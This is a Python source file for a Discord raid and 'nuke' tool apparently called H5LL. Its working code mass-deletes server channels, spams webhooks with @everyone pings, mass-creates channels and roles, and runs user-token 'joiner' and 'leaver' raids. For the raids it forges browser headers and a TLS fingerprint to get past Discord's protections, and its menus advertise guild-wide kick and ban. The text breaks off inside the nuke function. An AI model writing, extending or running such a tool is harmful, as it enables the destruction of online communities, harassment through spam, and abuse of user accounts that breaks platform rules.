import os
import sys
import subprocess
import subprocess
import time
import threading
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def center_text(text, width):
    lines = text.split('\n')
    centered_lines = [line.center(width) for line in lines]
    return '\n'.join(centered_lines)

def colored_horizontal_text(text, color, width, offset):
    colored_lines = [line[:offset] + color + line[offset:offset+width] + "\033[0m" + line[offset+width:] for line in text.split('\n')]
    return '\n'.join(colored_lines)

def show_loading_screen():
    text = """ 

 ▄ .▄▄▄▄ .▄▄▌  ▄▄▌      .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▪   ▄▄· ▄▄▄ ..▄▄ · 
██▪▐█▀▄.▀·██•  ██•      ▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌██ ▐█ ▌▪▀▄.▀·▐█ ▀. 
██▀▐█▐▀▀▪▄██▪  ██▪      ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐█·██ ▄▄▐▀▀▪▄▄▀▀▀█▄
██▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌    ▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▌▐███▌▐█▄▄▌▐█▄▪▐█
▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀      ▀▀▀▀  ▀▀▀ .▀  ▀. ▀  ▀▀▀·▀▀▀  ▀▀▀  ▀▀▀▀ 

    """

    purple_colors = [
        "\033[38;2;139;0;139m",
        "\033[38;2;128;0;128m",
        "\033[38;2;118;0;118m",
        "\033[38;2;108;0;108m",
        "\033[38;2;98;0;98m",
        "\033[38;2;88;0;88m",
        "\033[38;2;78;0;78m",
        "\033[38;2;68;0;68m",
        "\033[38;2;58;0;58m",
        "\033[38;2;48;0;48m",
    ]

    try:
        _, width = os.popen('stty size', 'r').read().split()
        width = int(width)
    except Exception:
        width = 80

    clear_screen()

    animation_speed = 0.05
    offset = 0

    for _ in range(30):
        for color in purple_colors:
            centered_text = center_text(text, width)
            colored_text = colored_horizontal_text(centered_text, color, width, offset)
            print(colored_text, end='', flush=True)
            time.sleep(animation_speed)
            clear_screen()
            offset = (offset + 1) % width  

    clear_screen()







def install_packages(packages):
    for package in packages:
        subprocess.run(["python", "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

packages = ["requests", "discord.py", "colorama", "discord", "pathlib", "tracemalloc", "asyncio", "pypresence", "plyer", "clickable", "webbrowser", "shutil", "tls_client", "fade", "hashlib", "websocket", "emoji", "httpx"]
installation_complete = False

loading_thread = threading.Thread(target=show_loading_screen)
loading_thread.start()
install_packages(packages)
installation_complete = True
loading_thread.join()


#loading screenended
import requests
from colorama import Fore;
from colorama import init, Fore, Style
import random
import discord
import asyncio
import pathlib
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands
from discord.ext import commands
from discord.ext import tasks
from discord.utils import get
import json
from pathlib import Path
from colorama import Fore , Style
import tracemalloc
import datetime
import shutil
import pypresence
from plyer import notification
import json
from discord import Embed
import clickable
import webbrowser
import os, requests, tls_client, datetime, sys, hashlib, threading, random, json, time, websocket, httpx, typing, subprocess
from colorama import Fore; import fade
import emoji as ej
# INFO THIS IS FROM BLOODYV2 ALL COPYRIGHTS CREDZ TO Dynka!
request = tls_client.Session(client_identifier="chrome_108",ja3_string="771,4866-4867-4865-103-49200-49187-158-49188-49161-49171-61-49195-49199-156-60-49192-51-53-49172-49191-52392-49162-107-52394-49196-159-47-57-157-52393-255,0-11-10-35-16-22-23-13-43-45-51-21,29-23-30-25-24,0-1-2",h2_settings={"HEADER_TABLE_SIZE": 65536,"MAX_CONCURRENT_STREAMS": 1000,"INITIAL_WINDOW_SIZE": 6291456,"MAX_HEADER_LIST_SIZE": 262144},h2_settings_order=["HEADER_TABLE_SIZE","MAX_CONCURRENT_STREAMS","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"],supported_signature_algorithms=["ECDSAWithP256AndSHA256","PSSWithSHA256","PKCS1WithSHA256","ECDSAWithP384AndSHA384","PSSWithSHA384","PKCS1WithSHA384","PSSWithSHA512","PKCS1WithSHA512",],supported_versions=["GREASE", "1.3", "1.2"],key_share_curves=["GREASE", "X25519"],cert_compression_algo="brotli",pseudo_header_order=[":method",":authority",":scheme",":path"],connection_flow=15663105,header_order=["accept","user-agent","accept-encoding","accept-language"])
r = Fore.RESET; c = Fore.MAGENTA; g = Fore.LIGHTBLACK_EX; tokens = open("data/tokens.txt", "r", encoding="utf8").read().splitlines(); messages = open("data/messages.txt", "r", encoding="utf8").read().splitlines()

def Headers(token):
    return {'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'fr-FR,fr;q=0.9','authorization': token,'cache-control': 'no-cache','content-type': 'application/json','cookie': '__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US','origin': 'https://discord.com','pragma': 'no-cache','referer': 'https://discord.com/channels/@me','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',}

def bypassheaders(token):  
        headers = {
        'authority': 'discord.com',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDExIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTc5ODgyLCJuYXRpdmVfYnVpbGRfbnVtYmVyIjozMDMwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
        'x-discord-locale': 'en',
        'x-debug-options': 'bugReporterEnabled',
        'accept-language': 'en',
        'authorization': token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://discord.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
         }
        return headers


def show_notification(title="H5LL Services", message="Thank you for using this tool.", timeout=5):
    notification.notify(
        title=title,
        message=message,
        timeout=timeout,
    )
show_notification()

text = """
                             ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                             ██▪▐█▀▄.▀·██•  ██•  
                             ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                             ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                             ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  
                       
        
        
         [01] - Discord        [02]- Change-Logs       [03] - Credits

"""


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


mainmainmenu = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            mainmainmenu += purple_colors[color_index] + line[i]
        else:
            mainmainmenu += " "
    mainmainmenu += Style.RESET_ALL 
    mainmainmenu += "\n"

text = """
                             ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                             ██▪▐█▀▄.▀·██•  ██•  
                             ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                             ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                             ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
"""


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


bannermainmenu = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            bannermainmenu += purple_colors[color_index] + line[i]
        else:
            bannermainmenu += " "
    bannermainmenu += Style.RESET_ALL 
    bannermainmenu += "\n"

timedate = datetime.datetime.now().strftime("%H:%M:%S")

text = "Channel Rate Limit! Waiting 0.75 Seconds..."


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


safemod2 = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            safemod2 += purple_colors[color_index] + line[i]
        else:
            safemod2 += " "
    safemod2 += Style.RESET_ALL  
    safemod2 += "\n"


text = "Message Rate Limit! Waiting 0.75 Seconds..."


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


safemod = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            safemod += purple_colors[color_index] + line[i]
        else:
            safemod += " "
    safemod += Style.RESET_ALL  
    safemod += "\n"


text = "WARNING "

yellow_colors = [
    "\033[93;38;5;11m",
    "\033[93;38;5;229m",
    "\033[93;38;5;220m",
    "\033[93;38;5;255m",
    "\033[93;38;5;143m"
]

lines = text.split("\n")


warning = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(yellow_colors)
            warning += yellow_colors[color_index] + line[i]
        else:
            warning += " "
    warning += Style.RESET_ALL  
    warning += "\n"

text = "Join Our Discord Server"

purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]

lines = text.split("\n")


linkdiscord = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            linkdiscord += purple_colors[color_index] + line[i]
        else:
            linkdiscord += " "
    linkdiscord += Style.RESET_ALL  
    linkdiscord += "\n"

def startermenu():
    clear_screen()
    print(mainmainmenu)
    print("")
    print("")
    print("")
    print("")
    print("")




    choicemenu = input(f"\033[90m{timedate}\033[38;2;139;0;139m  [H5LL] »   ")
    if choicemenu == "1":
        print(" ")             # before def execute
    elif choicemenu == "3":
        def clickable_link(url, text):
         clear_screen()
         print(bannermainmenu)
         print(f"\033]8;;{url}\033\\{text}\033]8;;\033\\")
        
        url = "https://discord.gg/UxBXmVHRdq"
        clickable_link(url, linkdiscord)
        print("dyynkaaaaa , H5LL")
        returnnig = input(f"\033[90m{timedate}\033[38;2;139;0;139m   »   ")
        returnnig = startermenu()


        
    
    elif choicemenu == "2":
        clear_screen()
        print(mainmainmenu)
        print(f"\033[90m1.03V \033[38;2;139;0;139m : Improved Nuker, Config Message Sent, And More!")
        print(f"\033[90m1.04V \033[38;2;139;0;139m : added safe mode if rate limit on nuker.")
        print(f"\033[90m1.05V \033[38;2;139;0;139m : Improved Visuals.")
        print(f"\033[90m1.1V \033[38;2;139;0;139m : Improved Configs, added decoded which accepts all kinds of text, and improved a bit the nofications.")
        print(f"\033[90m2V \033[38;2;139;0;139m : BIG UPDATE!, added auto nuke, next page, advanced configs, and more confi script.")
        print(f"\033[90m2.01V \033[38;2;139;0;139m : Moudle Update, added offical nuke advertiser which is reccomended..")
        print(f"\033[90m3V \033[38;2;139;0;139m : Added JOINER WHICH REQUIRES REAL TOKEN! ( credz to dyynkaaaaa )")


        #add here updates



        print("")
        returnnig = input(f"\033[90m{timedate}\033[38;2;139;0;139m   »   ")
        returnnig = startermenu()
        

    else:
        print("Please Pick Something From This List.")
        time.sleep(1)
        return startermenu()

startermenu()



def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


text = """
                             ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                             ██▪▐█▀▄.▀·██•  ██•  
                             ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                             ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                             ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀   
                                 Nuke Options:
        ----------------------------------------------------------------
        [01] - Best Nuke    [02] - Best Nuke (Cus)    [03] - Good (Cus)
        -----------------------------------------------------------------
"""


terminal_width = shutil.get_terminal_size().columns


left_padding = (terminal_width - max(len(line) for line in text.split("\n"))) // 2

purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]

optionsbannerdiscord2 = ""

for line in text.split("\n"):
    
    line_padding = " " * left_padding
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            optionsbannerdiscord2 += purple_colors[color_index] + line[i]
        else:
            optionsbannerdiscord2 += " "
    optionsbannerdiscord2 += Style.RESET_ALL
    optionsbannerdiscord2 += "\n"


text = """
                               ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                               ██▪▐█▀▄.▀·██•  ██•  
                               ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                               ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                               ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀    
                                   [2nd Page]
                                 
                                 
            [01]  - Joiner
            [02]  - Leaver
            [03]  - Sezuire

 
"""


terminal_width = shutil.get_terminal_size().columns


left_padding = (terminal_width - max(len(line) for line in text.split("\n"))) // 2

purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]

raidercooloptions = ""

for line in text.split("\n"):
    
    line_padding = " " * left_padding
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            raidercooloptions += purple_colors[color_index] + line[i]
        else:
            raidercooloptions += " "
    raidercooloptions += Style.RESET_ALL
    raidercooloptions += "\n"

text = """
                               ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                               ██▪▐█▀▄.▀·██•  ██•  
                               ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                               ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                               ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀    
                                    |1st Page|
 
        -----------------------------------------------------------------------------
        [01] - Nuke                   [05] - Webhook Spammer      [09] - Kick Guild                       
        [02] - Channel Creator        [06] - Token Checker        [10] - Ban Guild  
        [03] - Role Creator           [07] - Name Changer         [11] - Exit       
        [04] - Channel Deleter        [08] - DisplayChange Server [>>] - Next Page
        -----------------------------------------------------------------------------
"""


terminal_width = shutil.get_terminal_size().columns


left_padding = (terminal_width - max(len(line) for line in text.split("\n"))) // 2

purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]

optionsbannerdiscord = ""

for line in text.split("\n"):
    
    line_padding = " " * left_padding
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            optionsbannerdiscord += purple_colors[color_index] + line[i]
        else:
            optionsbannerdiscord += " "
    optionsbannerdiscord += Style.RESET_ALL
    optionsbannerdiscord += "\n"





init(autoreset=False)
print("\033[95m")
clear_screen()        


def mainmenu():
   
        RPC = pypresence.Presence(client_id="1155055359254339605")
        RPC.connect()
        start_time = int(time.time())
        

        presence_data = {
        "state": "Mastering the Universe - H5LL",
        "details": "Nuked 3/999",
        "start": start_time,
        "large_image": "coolimage",
        "large_text": "coolimage",
        "small_image": "dfv0fny-3094882f-83be-4ed8-95a8-cde46cb78881",
        "small_text": "dfv0fny-3094882f-83be-4ed8-95a8-cde46cb78881"
    }

        RPC.update(**presence_data)
        print(optionsbannerdiscord)
        



    
    

    


 






        choice = input(f"\033[90m{timedate}\033[38;2;139;0;139m  [H5LL] »   ")
        if choice == "1":
            NukeOptions()

        
        elif choice == "2":
            create_channels()
        elif choice == "3":
                RoleCreator()
            
        elif choice == "4":
         channel_deleter()
         time.sleep(0.95)
         mainmenu()
        
         

        elif choice == "5":
            webhook_spammer()

        elif choice == "6":
            bot_token_checker()

        
        elif choice == "7":
            change_bot_username()
        elif choice == "8":
           asyncio.run(changer())
        elif choice == "9":
            kick_all()
        elif choice == "10":
            ban_all()
        elif choice == "11":
            exit
        elif choice == ">>":
            raideroptions()
            
        elif choice == ">":
            raideroptions()

        
        else:
            print("Invalid choice. Please enter any of the listed options.")
            time.sleep(0.765)
            clear_screen()
            mainmenu()
    
def getemoji(count):
    with open(f"data/emojis.txt", "r", encoding="utf8") as f:
        emojis1 = [line.strip() for line in f.readlines()]
    random_emojis = random.sample(emojis1, (int(count)))
    return "".join(random_emojis)

def NukeOptions():
        clear_screen()
        print(optionsbannerdiscord2)
        
        
        
        
        choicemenu2 = input(f"\033[90m{timedate}\033[38;2;139;0;139m  [H5LL] »   ")
        if choicemenu2 == "1":
            asyncio.run(scraper())
        elif choicemenu2 == "2":
            asyncio.run(coolfunction())
            return NukeOptions()
        elif choicemenu2 == "3":
            asyncio.run(nuke())
        else:
            print("Please pick something from the list.")
            time.sleep(1)
            return NukeOptions()



class AppearanceSwitcher:
    def __init__(self):
        self.base_url = "https://discord.com/api/v10"

    def change_appearance(self, token):
        try:
            endpoint = "/users/@me/settings"
            headers = self.get_headers(token)

            appearance = "light" if random.randint(0, 1) == 0 else "dark"  # Randomly choose dark or light mode

            payload = {
                "theme": appearance,
            }

            response = requests.patch(f"{self.base_url}{endpoint}", headers=headers, json=payload)

            if response.status_code == 200:
                print(f"Appearance changed to {appearance} mode for token: {token}")
            else:
                print(f"Failed to change appearance for token: {token}. Status code: {response.status_code}")

        except Exception as e:
            print(f"An error occurred while changing appearance for token: {token}. Error: {e}")

    def get_headers(self, token):
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
        }
        return headers

def mainsezuier():
    appearance_switcher = AppearanceSwitcher()

    delay = int(input("Enter the delay in seconds between appearance switches: "))

    with open("data/tokens.txt", "r", encoding="utf8") as tokens_file:
        tokens = tokens_file.read().splitlines()

    if not tokens:
        print("No tokens found in data/tokens.txt. Please add tokens and try again.")
        return

    while True:
        for token in tokens:
            appearance_switcher.change_appearance(token)
            time.sleep(delay)

class Raider1:
    def leaver(self, t, server):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Put {c}tokens{r} to {c}data/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.delete(f'https://discord.com/api/v10/users/@me/guilds/{server}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Successfully left {c}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass


class Raider2:
    def joiner(self, t, invite):
        if len(tokens) == 0: 
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]   {r}Put {c}tokens{r} to {c}data/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.post(f'https://discord.com/api/v10/invites/{invite}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Joined {c}{token}{g}****{r} to {c}.gg/{invite}{r}")
                elif rr.status_code == 400: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[CAPTCHA]   {g}->    {r}Soldier {c}{token}{g}****{r} was captched {c}[RIP]{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass



def raideroptions():
    clear_screen()
    print(raidercooloptions)
    raidervalue = str(input(f"\033[90m{timedate}\033[38;2;139;0;139m  [H5LL] »   "))
    if raidervalue == "1":
        os.system('cls'); print(bannermainmenu)
        server = str(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Invite Link »   "))
        if server == "": raideroptions
        delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Delay »   "))
        if delay == "": raideroptions()
        serverinv = server.strip("https://"); invite = serverinv.split("/")[-1]
        os.system('cls'); print(bannermainmenu)
        raider = Raider2()
        for t in tokens:
            threading.Thread(target=raider.joiner, args=(t, invite)).start()
            time.sleep(delay)
        exit = input(""); exit = raideroptions()
    if raidervalue =="2":
        os.system('cls'); print(bannermainmenu)
        server = str(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Guild Id »   "))
        if server == "": NukeOptions()
        delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Delay »   "))
        if delay == "": NukeOptions()
        os.system('cls'); print(bannermainmenu)
        raider = Raider1()
        for t in tokens:
            threading.Thread(target=raider.leaver, args=(t, server)).start()
            time.sleep(delay)
        exit = input(""); exit = NukeOptions()
    if raidervalue =="3":
        mainsezuier()



#webhook spammer  OPTION 5


def webhook_spammer():
    


    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'webhook.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     webhook_url = file.readline().strip()
    print(bannermainmenu)


    content = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message »  ")
    num_times = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Amount Of Times »  ")

    if num_times.lower() == 'inf':
        num_times = float('inf')
    else:
        num_times = int(num_times)

    include_mentions = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Include Mentions y/n »  ").lower() == 'y'

    if include_mentions:
        content = f"{content}\n\n@everyone @here"

    delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Delay »  "))

    for _ in range(num_times):
        payload = {"content": content}
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"\033[32m""Message sent successfully!")

        time.sleep(delay)


#channels create or spammer OPTION 2


def create_channels():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)


    guild_id = input(f"\033[90m{timedate}\033[38;2;139;0;139m  Guild Id »  ")
    num_channels_to_create = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Amount Of Times »  "))
    base_channel_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m  Name Of Channel »  ")

    intents = discord.Intents.default()
    intents.guilds = True

    client = discord.Client(intents=intents)
    

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name} ({client.user.id})')
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if guild is not None:
            for i in range(1, num_channels_to_create + 1):
                channel_name = f'{base_channel_name}-{i}'
                await guild.create_text_channel(channel_name)
                print(f'Created channel: {channel_name}')
        await client.logout()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(client.start(TOKEN))

#delete channels OPTION 3

def RoleCreator():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    
    intents = discord.Intents.default()
    intents.guilds = True 
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(bannermainmenu)



        GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
        print(f"\033[38;2;139;0;139mFethcing Guild....")
        guild = client.get_guild(int(GUILD_ID))

        if guild:
            role_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name Of Roles »  ")
            num_roles = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Amount Of Times »  "))

            for i in range(num_roles):
                color = discord.Colour.random()

                await guild.create_role(name=role_name, colour=color)
                print(f"Role '{role_name}' {i + 1}/{num_roles} has been created with color {color}")

            print(f"Created {num_roles} roles with the name '{role_name}' in the server: {guild.name}")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

        client.close()

    client.run(TOKEN)

#channel deleter option 4


def channel_deleter():
    
    print(optionsbannerdiscord)
    clear_screen()
    script_dir = Path(__file__).resolve().parent

    data_dir = script_dir / "data"
    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
        print("The 'bottoken.txt' file does not exist. Creating it now...")
        bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
        TOKEN = file.readline().strip()
    print(bannermainmenu)



    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))
    print(f"\033[38;2;139;0;139mFethcing Guild....")

    intents = discord.Intents.default()
    intents.all()

    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        clear_screen()
        time.sleep(0.5)
        print(f"\033[38;2;139;0;139mDeleting All Channels...")
        guild = discord.utils.get(bot.guilds, id=int(GUILD_ID))
        if guild is not None:
            for channel in guild.text_channels:
                await channel.delete()
                print(f"Deleted {channel}")
                await asyncio.sleep(0)  

    bot.run(TOKEN)


            







#NUKER DEVELOPMENT


async def nuke():
    clear_screen()
    script_dir = Path(__file__).resolve().parent

    data_dir = script_dir / "data"

    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
        print("The 'bottoken.txt' file does not exist. Creating it now...")
        bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
        TOKEN = file.readline().strip()
    print(bannermainmenu)

